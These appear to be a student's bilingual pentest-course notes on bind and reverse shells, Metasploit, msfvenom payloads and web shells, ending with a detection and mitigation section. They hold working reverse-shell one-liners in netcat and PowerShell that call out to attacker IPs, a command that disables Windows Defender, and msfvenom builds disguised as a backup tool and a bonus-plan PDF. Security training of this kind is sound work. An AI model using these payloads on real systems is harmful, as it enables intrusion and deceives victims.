
# Table of Contents
- [Shells Jack Us In, Payloads Deliver Us Shells](#shells-jack-us-in-payloads-deliver-us-shells)
  - [Payload deliver us shells](#payload-deliver-us-shells)
- [Anatomy of a shell](#anatomy-of-a-shell)
- [Bind shells](#bind-shells)
  - [What is it?](#what-is-it)
  - [Practicing with GNU Netcat](#practicing-with-gnu-netcat)
    - [No. 1: Server - Target starting Netcat listener](#no-1-server---target-starting-netcat-listener)
    - [No. 2: Client - Attack box connecting to target](#no-2-client---attack-box-connecting-to-target)
    - [No. 3: Server - Target receiving connection from client](#no-3-server---target-receiving-connection-from-client)
    - [No. 4: Client - Attack box sending message Hello Academy](#no-4-client---attack-box-sending-message-hello-academy)
    - [No. 5: Server - Target receiving Hello Academy message](#no-5-server---target-receiving-hello-academy-message)
  - [Establishing a Basic Bind Shell with Netcat](#establishing-a-basic-bind-shell-with-netcat)
    - [No. 1: Server - Binding a Bash shell to the TCP session](#no-1-server---binding-a-bash-shell-to-the-tcp-session)
    - [No. 2: Client - Connecting to bind shell on target](#no-2-client---connecting-to-bind-shell-on-target)
- [Reverse Shells](#reverse-shells)
  - [Hands-on With A Simple Reverse Shell in Windows](#hands-on-with-a-simple-reverse-shell-in-windows)
    - [Server](#server)
    - [Client (target)](#client-target)
    - [Server (attack box)](#server-attack-box)
- [Introduction to Payloads](#introduction-to-payloads)
  - [Netcat/Bash Reverse Shell One-liner](#netcatbash-reverse-shell-one-liner)
  - [PowerShell One-liner Explained](#powershell-one-liner-explained)
    - [Calling PowerShell](#calling-powershell)
    - [Binding A Socket](#binding-a-socket)
    - [Setting The Command Stream](#setting-the-command-stream)
    - [Empty Byte Stream](#empty-byte-stream)
    - [Stream Parameters](#stream-parameters)
    - [Set The Byte Encoding](#set-the-byte-encoding)
    - [Invoke-Expression](#invoke-expression)
    - [Show Working Directory](#show-working-directory)
    - [Sets Sendbyte](#sets-sendbyte)
    - [Terminate TCP Connection](#terminate-tcp-connection)
- [Automating Payloads & Delivery with Metasploit](#automating-payloads--delivery-with-metasploit)
  - [Nmap scan](#nmap-scan)
  - [Searching Within Metasploit](#searching-within-metasploit)
  - [Option Selection](#option-selection)
  - [Examining an Exploit's Options](#examining-an-exploit's-options)
  - [Setting Options](#setting-options)
  - [Exploits Away](#exploits-away)
- [Crafting Payloads with MSFvenom](#crafting-payloads-with-msfvenom)
  - [Practicing with MSFvenom](#practicing-with-msfvenom)
  - [Staged vs. Stageless Payloads](#staged-vs-stageless-payloads)
  - [Building A Stageless Payload](#building-a-stageless-payload)
    - [Build it](#build-it)
    - [Executing stagelss payload](#executing-stagelss-payload)
  - [Building a simple Stageless Payload for a Windows system](#building-a-simple-stageless-payload-for-a-windows-system)
    - [Windows payload](#windows-payload)
    - [Executing a Simple Stageless Payload On a Windows System](#executing-a-simple-stageless-payload-on-a-windows-system)
- [Infiltrating Windows](#infiltrating-windows)
  - [Enumerating Windows & Fingerprinting Methods](#enumerating-windows--fingerprinting-methods)
    - [Banner Grab to Enumerate Ports](#banner-grab-to-enumerate-ports)
  - [Bats, DLLs, & MSI Files](#bats-dlls--msi-files)
    - [Payload types to consider](#payload-types-to-consider)
  - [Tools, Tactics, and Procedures for Payload Generation, Transfer, and Execution](#tools-tactics-and-procedures-for-payload-generation-transfer-and-execution)
    - [Payload generation](#payload-generation)
    - [Payload transfer and execution](#payload-transfer-and-execution)
  - [CMD-Prompt and PowerShells for Fun and Profit](#cmd-prompt-and-powershells-for-fun-and-profit)
  - [WSL and powershell for linux](#wsl-and-powershell-for-linux)
- [Spawning interactive shells](#spawning-interactive-shells)
- [Introduction to Web Shells](#introduction-to-web-shells)
  - [What is a web shell?](#what-is-a-web-shell)
- [Laudanum](#laudanum)
- [Detection & prevention](#detection--prevention)
  - [MITRE ATT&CK](#mitre-attck)
  - [Eventi da Monitorare](#eventi-da-monitorare)
  - [Visibilità di Rete](#visibilità-di-rete)
  - [Protezione degli End-Device](#protezione-degli-end-device)
  - [Strategie di Mitigazione Consigliate](#strategie-di-mitigazione-consigliate)
  
# Shells Jack Us In, Payloads Deliver Us Shells
A shell is a program that provides a computer user with an interface to input instructions into the system and view text output (Bash, Zsh, cmd, and PowerShell, for example). As penetration testers and information security professionals, a shell is often the result of exploiting a vulnerability or bypassing security measures to gain interactive access to a host.

Se non riusciamo a stabilire una shell session, siamo molto limitati nel navigare nella macchina della vittima.
Vedremo le shell sotto tre punti di vista:
1. computing: bash, zsh, cmd, powershell.
2. exploitation & security: shell è il risultato di exploitare una vulnerabilita o bypassare una misura di sicurezza per ottenere accesso alla vittima, eg triggering EternalBlue in windows host.
3. web: simile a una shell standard, con la differenza che sfrutta una vulnerabilità (eg caricare un file o uno script) che consente all'attaccante di impartire istruzioni, leggere e accedere ai file e potenzialmente eseguire azioni distruttive sul sistema host sottostante.

## Payload deliver us shells
Un payload puo essere definito sotto diversi aspetti:
- networking: porzione di dati incapsulati nei pacchetti trasmetti in rete
- basic computing: porzione di instruzioni che definiscono l'azione da intraprendere
- programming: porzione di dati a cui fa riferimento l'istruzione del linguaggio di programmazione   
- exploitation & security: codice creato con lo scopo di sfruttare una vulnerabilita di un sistema.

# Anatomy of a shell
Ogni sistema operativo ha una shell, per interagire con essa dobbiamo usare un applicazione conosciuta come *terminal emulator*, eg windows terminal-windows, putty-windows, xterm-linux, gnome terminal-linux, konsole-linux, terminal-macos,etc.

# Bind shells
Stabilire una shell su un sistema in una rete locale o remota, ovvero prendere il controllo del terminal emulator

## What is it?
il target system ha un listener e aspetta un connessione da parte di un altro sistema. (attaccante).
![img](./img/bind_shell.png)
- There would have to be a listener already started on the target.
- If there is no listener started, we would need to find a way to make this happen.
- Admins typically configure strict incoming firewall rules and NAT (with PAT implementation) on the edge of the network (public-facing), so we would need to be on the internal network already.
- Operating system firewalls (on Windows & Linux) will likely block most incoming connections that aren't associated with trusted network-based applications.

## Practicing with GNU Netcat

### No. 1: Server - Target starting Netcat listener

### No. 2: Client - Attack box connecting to target

### No. 3: Server - Target receiving connection from client

### No. 4: Client - Attack box sending message Hello Academy

### No. 5: Server - Target receiving Hello Academy message

## Establishing a Basic Bind Shell with Netcat
Nel caso precedente non abbiamo propriamente una bind shell perche non possiamo interagire con so o il file system. Vediamo come farlo ora.

### No. 1: Server - Binding a Bash shell to the TCP session
Target@server:~$ rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l targetIP 7777 > /tmp/f

Il comando sopra viene considerato come il payload.

### No. 2: Client - Connecting to bind shell on target
crirom00@htb[/htb]$ nc -nv 10.129.41.200 7777

Target@server:~$  

Bind shell molto più facile da difendere rispetto alle altre.

# Reverse Shells
L'attaccante ha un listener running e il target inizializza la connessione.
![img](./img/rev_Shell.png)

1. Perché si preferisce la Reverse Shell:
Bypass del Firewall: Gli amministratori di sistema tendono a bloccare le connessioni in ingresso, rendendo le bind shell difficili da applicare in scenari reali. Tuttavia, spesso trascurano il traffico in uscita.

Funzionamento: L'attaccante avvia un listener sulla propria macchina d'attacco e sfrutta una vulnerabilità sul target (es. Command Injection o File Upload) per forzare la vittima a connettersi verso l'esterno.

2. Payload e Risorse Utili
Reverse Shell Cheat Sheet: Non occorre riscrivere i comandi da zero; esistono repository e strumenti pubblici con elenchi di payload pronti per diversi linguaggi ed ambienti. !
[Reverse shell cheat sheet](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/)

Consapevolezza e Personalizzazione: Poiché anche i difensori e gli amministratori di rete conoscono questi repository pubblici per configurare SIEM e controlli di sicurezza, spesso è necessario modificare o personalizzare i payload per evitare il rilevamento.

## Hands-on With A Simple Reverse Shell in Windows

### Server 
crirom00@htb[/htb]$ sudo nc -lvnp 443

1. Uso di Porte Comuni (Bypass Firewall Outbound)Scelta della Porta 443 (HTTPS): Impostare il listener su porte standard come la 443 (o 80) riduce il rischio che la connessione in uscita della reverse shell venga bloccata dai firewall locali o di rete, poiché il traffico HTTPS verso l'esterno è quasi sempre consentito nelle reti aziendali.Limite (DPI / Layer 7): I firewall avanzati dotati di Deep Packet Inspection (DPI) possono comunque rilevare la shell anche sulla porta 443, poiché analizzano il contenuto del pacchetto (che non sarà un vero handshake SSL/TLS) e non solo la porta/IP.
2. Limiti di Netcat su Windows e Approccio LOLBASNetcat non è nativo: A differenza di Linux, nc.exe non è presente di default su Windows. Affidarsi a Netcat richiede prima il caricamento del binario sul target, operazione complessa se non si ha già una funzionalità di file upload.Living Off The Land (LOLBAS): È preferibile utilizzare esclusivamente gli strumenti e i linguaggi nativi dell'ambiente bersaglio (come PowerShell e CMD), garantendo maggiore affidabilità ed evitando il trasferimento di file aggiuntivi.
3. Strategia OperativaAnalisi dell'Ambiente: Prima di tentare la reverse shell, occorre verificare quali interpreti e strumenti sono già disponibili sulla macchina vittima.PowerShell One-Liner: Per stabilire la reverse shell da Windows senza installare software esterno, lo standard consiste nell'eseguire un one-liner nativo in PowerShell.

## Client (target)
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

### Disabe Antivirus
PS C:\Users\htb-student> Set-MpPreference -DisableRealtimeMonitoring $true

## Server (attack box)
crirom00@htb[/htb]$ sudo nc -lvnp 443

-->  PS C:\Users\htb-student> whoami

# Introduction to Payloads

## Netcat/Bash Reverse Shell One-liner
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.14.12 7777 > /tmp/f

## PowerShell One-liner Explained
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

### Calling PowerShell
powershell -nop -c 

### Binding A Socket
"$client = New-Object System.Net.Sockets.TCPClient(10.10.14.158,443);


### Setting The Command Stream
$stream = $client.GetStream();

### Empty Byte Stream
[byte[]]$bytes = 0..65535|%{0}; 

### Stream Parameters
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)


### Set The Byte Encoding
{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i);

### Invoke-Expression
$sendback = (iex $data 2>&1 | Out-String ); 


### Show Working Directory
$sendback2 = $sendback + 'PS ' + (pwd).path + '> '; 

### Sets Sendbyte
$sendbyte=  ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}

### Terminate TCP Connection
$client.Close()"

The one-liner we just examined together can also be executed in the form of a PowerShell script (.ps1). We can see an example of this by viewing the source code below. This source code is part of the nishang project: [powershell script .ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1)


# Automating Payloads & Delivery with Metasploit
crirom00@htb[/htb]$ sudo msfconsole 


## Nmap scan
crirom00@htb[/htb]$ nmap -sC -sV -Pn 10.129.164.25

## Searching Within Metasploit
msf6 > search smb

## Option Selection
msf6 > use 56

## Examining an Exploit's Options
msf6 exploit(windows/smb/psexec) > options

## Setting Options
msf6 exploit(windows/smb/psexec) > set RHOSTS 10.129.180.71

## Exploits Away
msf6 exploit(windows/smb/psexec) > exploit

doppo aver lanciato l'exploit, se tutto va per il verso giusto viene stabilita una meterpreter shell session and a system level shell session. Meterpreter è un payload che usache stabilisce un canale di comunicazione fra target e attaccante. Con ? vediamo una lista di comandi da poter usare in meterpreter session, è bene lanciare il comando shell per ottenere una system-level shell per utilizzare tutti i comandi nativi del sistema target.


# Crafting Payloads with MSFvenom

Raggiungibilità di Rete vs. Consegna Alternativa

Gli attacchi diretti con Metasploit richiedono connettività di rete verso il bersaglio.

Quando il bersaglio si trova in una rete isolata o non direttamente raggiungibile, è necessario veicolare il payload in modo indiretto (es. tramite e-mail o tecniche di ingegneria sociale per indurre l'esecuzione del file).

Flessibilità e Offuscamento con MSFvenom

MSFvenom permette di generare payload in molteplici formati eseguibili e script per adattarsi a diversi contesti di consegna.

Include funzionalità di encoding e cifratura per modificare la struttura del payload, riducendo la possibilità che venga rilevato dalle firme statiche degli antivirus.

## Practicing with MSFvenom
msfvenom -l payloads: list all payloads

## Staged vs. Stageless Payloads
1. Payload Staged: piu componenti inviate
	
	Funzionamento: Invia inizialmente un componente di dimensioni ridotte (stage) eseguito sulla macchina bersaglio, ed effettua una callback verso la macchina d'attacco per scaricare via rete il resto del payload, che viene poi eseguito in memoria per stabilire la sessione.

	Sintassi in Metasploit: Riconoscibile dalla barra / che separa le componenti (es. linux/x86/shell/reverse_tcp).

	Svantaggi: Occupa spazio in memoria per la gestione degli stadi e richiede più traffico di rete sequenziale, il che può causare instabilità se la connessione ha problemi di latenza o banda.

2. Payload Stageless: singola componente inviata

	Funzionamento: Contiene l'intero codice necessario all'interno di un unico pacchetto/eseguibile e viene inviato nella sua interezza in un'unica soluzione, senza scaricare componenti aggiuntivi via rete in un secondo momento.

	Sintassi in Metasploit: Riconoscibile dall'uso dell'underscore _ prima del tipo di connessione (es. linux/zarch/meterpreter_reverse_tcp).

	Vantaggi:

	Stabilità: Ideale in ambienti con banda limitata o elevata latenza, dove il caricamento a stadi potrebbe fallire o interrompersi.

	Evasione: Riduce il volume complessivo di traffico di rete generato dopo l'esecuzione iniziale, risultando spesso più discretodurante le fasi di consegna tramite ingegneria sociale.

## Building A Stageless Payload
### Build it
crirom00@htb[/htb]$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > createbackup.elf

- msfvenom -p: defines the tool to make the payload and -p option create the payload
- linux/...: choosing payload based on atch
- LHOST=10.10.14.113 LPORT=443: specify the ip address and port to which the payload will call back
- -f elf: specifies the format the generated binary will be in.
- \> createbackup.elf: create elf binary


## Executing stagelss payload
Una volta generato un payload stageless sulla macchina d'attacco, è necessario veicolarlo sul sistema target. Tra i vettori di consegna più comuni figurano:

- E-mail: Allegato malevolo inviato direttamente all'utente.

- Link di download: Indirizzare l'utente a un sito web controllato dall'attaccante.

- Modulo di exploit (Metasploit): Consegna automatizzata tramite rete (richiede solitamente l'accesso alla rete interna).

- Supporti fisici: Unità flash USB nell'ambito di un audit di sicurezza in loco (onsite penetration test).

Oltre al trasferimento, il file deve essere eseguito sul sistema bersaglio per attivare la sessione.

Scenario: Se il target è una macchina Linux usata da un amministratore di rete per gestire dispositivi, l'esecuzione può avvenire inducendo l'amministratore a cliccare sull'allegato e-mail attraverso tecniche di ingegneria sociale, sfruttando abitudini di navigazione non sicure su una workstation di gestione.


crirom00@htb[/htb]$ sudo nc -lvnp 443: si attende una connessione all'attaccante da parte del target tramite il payload lanciato

## Building a simple Stageless Payload for a Windows system

## Windows payload
crirom00@htb[/htb]$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > BonusCompensationPlanpdf.exe

## Executing a Simple Stageless Payload On a Windows System
Senza alcun sistema di cifratura il payload verrebbe bloccato dell'av di windows. Se l'av viene disabilitato, gli utenti basta che clicchino sul file per eseguirlo.

# Infiltrating Windows
Microsoft domina il mercato home e enterprise dei computer. Con l'introduzione di Active Directory, servizi cloud, wsl, e molte altre features, la superficie d'attacco è cresciuta esponenzialmente (neli ultimi anni riportate circa 3688 vulnerabilità nei prodotti windows), per esempio:
- MS08-067
- Eternal Blue
- PrintNightmare
- BlueKeep
- Sigred
- SeriousSam
- Zerologon

## Enumerating Windows & Fingerprinting Methods
Dati un insieme di target, in che modi posso decidere se l'host è una macchina windows? Guardiamo ad aclune cose: 
1. ping TTL: un risposta tipa di windows è 32 oppure 128, dove la maggior parte degli host non ha mai piu di 20 hops dall'host di partenza ([ttl table](https://subinsb.com/default-device-ttl-values/)).

2. Un altro modo è utilizzare nmap con l'opzione -O per identificare il sistema operativo. Se la scansione da problemi, riprova con opzioni -A e -Pn. 

### Banner Grab to Enumerate Ports
crirom00@htb[/htb]$ sudo nmap -v 192.168.86.39 --script banner.nse: utilizzare banner.nse script per tentare di connettersi ad ogni porta e catturare informazioni da esse. 

## Bats, DLLs, & MSI Files

### Payload types to consider
Ciascun formato sfrutta diverse componenti o motori di esecuzione nativi del sistema operativo Windows per ottenere l'esecuzione di comandi o stabilire una shell:
- DLL (Dynamic Link Library): Librerie condivise del sistema. Vengono utilizzate principalmente per tecniche di DLL Hijacking o DLL Injection, che consentono di eseguire codice all'interno del contesto di un processo legittimo per privilegiare l'accesso (es. a SYSTEM) o bypassare il User Account Control (UAC).

- Batch (.bat): Script di testo per l'interprete dei comandi DOS (cmd.exe). Utili per l'automazione di comandi in sequenza, come la configurazione di connessioni di rete o la raccolta rapida di informazioni di sistema (enumeration).

- VBScript (.vbs): Linguaggio di scripting interpretato dal Windows Script Host (WSH). Utilizzato prevalentemente nei vettori di Phishing o integrato come macro all'interno di documenti di Office (es. Excel) per avviare il caricamento di codice aggiuntivo.

- MSI (.msi): File di installazione per il Windows I nstaller. Possono essere eseguiti tramite l'utilità nativa msiexec.exe, spesso sfruttata per l'esecuzione di payload con privilegi elevati durante le fasi di installazione o configurazione.

- PowerShell (.ps1): Shell e ambiente di scripting avanzato basato sul framework .NET. Offre un'elevata flessibilità per interagire direttamente con le API del sistema operativo e gestire l'esecuzione in memoria.
 

Scelta del Formato: Il tipo di file da generare dipende strettamente dal vettore di consegna (es. e-mail, esecuzione da riga di comando, sostituzione di librerie) e dal contesto del target.

Living Off The Land: La maggior parte di questi formati sfrutta interpreti già presenti di default in Windows (cmd.exe, wscript.exe, msiexec.exe, powershell.exe), evitando la necessità di installare software aggiuntivo sul bersaglio.

## Tools, Tactics, and Procedures for Payload Generation, Transfer, and Execution

Metodi di generazione di payload e modi per trasferili alla vittima.

### Payload generation
- MSFVenom & Metasploit-Framework (https://github.com/rapid7/metasploit-framework)
- Payloads All The Things (https://github.com/swisskyrepo/PayloadsAllTheThings)
- Mythic C2 Framework (https://github.com/its-a-feature/Mythic)
- Nishang (https://github.com/samratashok/nishang)
- Darkarmour (https://github.com/bats3c/darkarmour)

### Payload transfer and execution
- Impacket: tool python che fornisce un modo per interagire direttamente con protocolli di rete.
- Payload all the things: find quick oneliners per facilitare il trasferimento di files attaverso gli host.
- SMB: può fornire un metodo facilmente sfruttabile per trasferire file tra host.
- Remote execution via MSF
- Other protocols: FTP, TFTP, HTTP/S, e altri protocolli per trasferire file agli host

## CMD-Prompt and PowerShells for Fun and Profit
1. Confronto Generale

	CMD (cmd.exe): È la shell originale MS-DOS integrata in Windows, pensata per interazioni di base ed esecuzione di script batch semplici (.bat). L'input e l'output vengono gestiti esclusivamente come testo semplice.

	PowerShell: È la shell moderna basata sull'ambiente .NET. Supporta tutti i comandi tradizionali di MS-DOS oltre a cmdlet avanzati e moduli personalizzati. Input e output vengono gestiti ed elaborati come oggetti .NET.

2. Differenze su Tracciabilità e Sicurezza

	Log e Tracciabilità: CMD non mantiene una cronologia dettagliata dei comandi eseguiti durante la sessione, risultando meno evidente nei log locali. PowerShell registra la cronologia dei comandi (es. PSReadLine), rendendo le azioni più visibili all'audit di sistema.

	Criteri di Protezione: PowerShell è soggetto a restrizioni di sicurezza come la Execution Policy e i controlli UAC (User Account Control). CMD non è vincolato dalle Execution Policy di PowerShell.

	Compatibilità Storica: PowerShell è stato introdotto nativamente a partire da Windows 7. Su sistemi legacy più datati (es. Windows XP o Server 2003), CMD è spesso l'unica shell disponibile.

## WSL and powershell for linux
1. Windows Subsystem for Linux (WSL) come Vettore di Attacco

	Integrazione del Sistema: WSL fornisce un ambiente Linux virtualizzato all'interno di Windows, offrendo nuovi canali per l'esecuzione di payload e binary creati per Linux (o script Python3) direttamente su host Windows.

	Punto Cieco per la Sicurezza: Attualmente, il traffico di rete e le chiamate eseguite dall'istanza WSL spesso non vengono analizzati dal Windows Firewall o da Windows Defender, consentendo l'evasione dei controlli AV ed EDR tradizionali dell'host.

2. PowerShell Core su Linux
	Cross-Platform: PowerShell Core consente l'esecuzione delle funzionalità tipiche di PowerShell anche su ambienti Linux.

	Sfida di Rilevamento: Come per WSL, la presenza di PowerShell in ambienti Linux rappresenta un vettore meno monitorato dai controlli di sicurezza classici, rendendo le attività malevole più difficili da individuare dai log di sistema standard. 

# Spawning interactive shells
1. Il Problema della Shell Limitata (Jail Shell)

	Quando si ottiene un primo accesso su un sistema Linux, spesso la shell generata è non-interattiva o priva del controllo dei job (no job control).

	Se Python non è installato sul bersaglio (rendendo impossibile l'uso del classico python -c 'import pty; pty.spawn("/bin/bash")'), occorre utilizzare altri interpreti o strumenti nativi presenti nel sistema.

2. Metodi per Generare una Shell Interattiva

- /bin/sh -i: Avvia direttamente l'interprete di comandi standard in modalità interattiva (-i).

-	Perl: perl -e 'exec "/bin/sh";' (esegue la shell sostituendo il processo Perl corrente).

-	Ruby: ruby: exec "/bin/sh" (invocabile all'interno di uno script Ruby).

-	Lua: lua: os.execute('/bin/sh') (sfrutta la funzione nativa di esecuzione comandi di sistema).

-	AWK: awk 'BEGIN {system("/bin/sh")}' (esegue la shell nella clausola BEGIN prima dell'elaborazione di qualsiasi input).

-	find . -exec /bin/sh \; -quit (sfrutta il parametro -exec per lanciare la shell ed uscire subito dopo).

-	vim -c ':!/bin/sh' (esegue il comando tramite la flag -c all'avvio).

	Oppure, dall'interno di Vim: :set shell=/bin/sh seguito dal comando :shell.


# Introduction to Web Shells
- Centralità delle Web App: I servizi software e d'intrattenimento si sono spostati quasi interamente sul web (accessibili via HTTP/S), rendendo le applicazioni web il bersaglio principale delle attività di pentesting.

- Vettore di attacco: Poiché le reti perimetrali aziendali sono sempre più protette e non espongono più servizi vulnerabili, l'accesso iniziale (foothold) a una rete interna avviene per lo più tramite:

	- Attacchi alle applicazioni web (SQLi, LFI/RFI, Command Injection, File Upload).

	- Password spraying (su portali VPN, OWA, Citrix, ecc.).

	- Social engineering.

- Superficie d'attacco: funzionalità di caricamento file (form pubblici, avatar utente, pannelli amministrativi come Tomcat/WebLogic, o FTP con permessi errati). Sfruttando vulnerabilità di unrestricted file upload, è possibile caricare una web shell per eseguire codice sul server.

## What is a web shell?
Una web shell è una sessione di shell basata su browser che possiamo utilizzare per interagire con il sistema operativo sottostante di un server web. 

La maggior parte delle web shell si ottiene caricando sul server bersaglio un payload, che dovrebbe darci la capacità di eseguire codice da remoto all'interno del browser.


Nella maggior parte dei casi, questo è il metodo iniziale per ottenere l'esecuzione remota di codice tramite un'applicazione web, che possiamo poi sfruttare in seguito per passare a una reverse shell più interattiva e garantire la persistenza sul sistema.

# Laudanum
Laudanum è una repo di file iniettabili per ottenere accesso alla vittima tramite reverse shell. Include files in asp, aspx, jsp, php, etc.

Scegliere da /usr/share/laudamun/ la web shell copiare e modificare parametrim successivamente caricarla in un form e testare se è protetto da web shell.

# Detection & prevention
1. Il Framework MITRE ATT&CK [mitre](https://attack.mitre.org/)

Notable MITRE ATT&CK Tactics and Techniques:

- Initial Access (Accesso Iniziale): Compromissione di servizi esposti (web app, misconfigurazioni SMB) per ottenere un primo punto d'appoggio (foothold) [OWASP top ten](https://owasp.org/www-project-top-ten/).

- Execution (Esecuzione): Esecuzione di codice/payload sull'host vittima (tramite comandi nel browser, PowerShell, exploit o upload di file).

- Command & Control - C2 (Comando e Controllo): Mantenimento dell'accesso interattivo e comunicazione con la macchina compromessa (usando traffico HTTP/S, DNS, NTP o app consentite come Teams/Discord).

2. Eventi da Monitorare (Indicatori di Compromissione)

Upload di file: Monitorare i log delle applicazioni web per rilevare il caricamento di file malevoli (web shell).

Azioni sospette di utenti non-admin: Comandi insoliti eseguiti da utenti standard (es. whoami via Bash/CMD, PowerShell) o connessioni SMB anomale tra host finali (end-to-end anziché verso i server di rete).

Sessioni di rete anomale: Rilevamento di traffico insolito tramite l'analisi di dati NetFlow (es. traffico verso porte non standard come la 4444 di Meterpreter, tentativi di login remoti o picchi di richieste GET/POST).

3. Visibilità di Rete

Mappatura e Baselines: È essenziale mantenere schemi di topologia di rete aggiornati (anche tramite tool interattivi come NetBrain) e definire un comportamento di rete "normale" (baseline).

Visibilità Layer 7 e Ispezione: Utilizzare apparati di rete moderni con visibilità a livello applicativo (Layer 7) e capacità di Deep Packet Inspection (DPI) per bloccare payload non crittografati in transito (es. sessioni Netcat in chiaro).

4. Protezione degli End-Device (Endpoint Security)

Hardening degli Endpoints: Mantenere attivi e aggiornati Antivirus/EDR (es. Microsoft Defender) e firewall locali su tutti i dispositivi (PC, server, NAS, stampanti).

Strategia di Patching: Applicare rapidamente gli aggiornamenti di sicurezza rilasciati dai vendor.

5. Strategie di Mitigazione Consigliate

Application Sandboxing: Isolare le applicazioni esposte all'esterno per limitare i danni in caso di compromissione.

Principio del Minimo Privilegio (Least Privilege): Riconfigurare i permessi in modo che gli utenti ordinari non abbiano privilegi amministrativi (o di Domain Admin).

Segmentazione dell'Host: Posizionare i server esposti a Internet (es. web server) all'interno di una DMZ per impedire movimenti laterali verso la rete interna.

Firewall Fisici e Applicativi (WAF): Implementare regole rigide di traffico inbound ed outbound (es. bloccare uscite su porte non autorizzate) per spezzare il funzionamento di bind e reverse shell.